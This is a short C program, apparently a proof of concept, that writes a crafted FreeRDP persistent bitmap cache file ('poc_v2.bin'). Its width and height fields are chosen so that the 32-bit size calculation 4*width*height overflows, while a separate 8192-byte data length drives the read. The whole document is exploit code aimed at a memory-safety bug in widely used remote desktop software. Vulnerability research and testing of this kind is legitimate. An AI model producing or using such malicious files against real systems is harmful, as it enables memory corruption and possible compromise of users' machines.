#include <stdio.h>
#include <stdint.h>

// Real original PERSISTENT_CACHE_ENTRY_V2 layout from FreeRDP persistent.c
typedef struct {
    uint64_t key64;
    uint32_t width;
    uint32_t height;
    uint32_t storedDataLen;
    uint32_t flags;
} entry_v2;

int main(void)
{
    FILE *fp = fopen("poc_v2.bin", "wb");
    if (!fp) {
        perror("fopen failed");
        return 1;
    }
    entry_v2 e;
    e.key64 = 0x1122334455667788ULL;
    // Trigger 32-bit unsigned multiplication overflow: 4 * w * h overflows
    e.width  = 0x40000002U;
    e.height = 0x40000002U;
    e.storedDataLen = 8192; // independent length for fread
    e.flags = 0;

    fwrite(&e, sizeof(entry_v2), 1, fp);

    unsigned char garbage[8192] = {0xAA};
    fwrite(garbage, 1, sizeof(garbage), fp);

    fclose(fp);
    printf("Generated poc_v2.bin successfully\n");
    return 0;
}

